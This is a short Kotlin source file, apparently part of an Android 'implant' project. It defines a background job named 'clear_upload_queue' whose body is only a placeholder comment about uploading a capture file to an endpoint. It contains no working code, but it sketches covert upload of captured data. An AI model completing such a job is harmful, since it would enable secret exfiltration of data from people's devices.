package com.cooperthecoder.implant.jobs

import com.evernote.android.job.Job

class UploadQueueJob : Job() {

    companion object {
        const val JOB_NAME = "clear_upload_queue"
    }

    override fun onRunJob(params: Params): Result {
        // Upload capture file to endpoint
        return Result.SUCCESS
    }

}